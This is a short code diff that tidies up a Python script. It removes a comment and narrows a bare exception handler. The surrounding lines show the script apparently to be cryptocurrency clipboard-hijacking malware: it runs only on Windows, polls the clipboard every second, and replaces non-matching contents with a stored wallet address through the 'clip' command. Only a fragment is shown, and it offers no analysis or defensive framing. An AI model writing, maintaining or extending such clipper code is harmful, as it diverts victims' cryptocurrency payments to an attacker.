@@ -4,7 +4,6 @@ import subprocess
 import time
 import os
 import re
-#Imports
 
 if os.name != 'nt':
     os._exit(0)
@@ -47,7 +46,7 @@ class Clip:
                     elif not address_matches:
                         subprocess.Popen(['clip'], shell=True, stdin=subprocess.PIPE, encoding='utf8').communicate(self.wallets[0].strip())
 
-            except:
+            except Exception:
                 pass
 
             time.sleep(1)
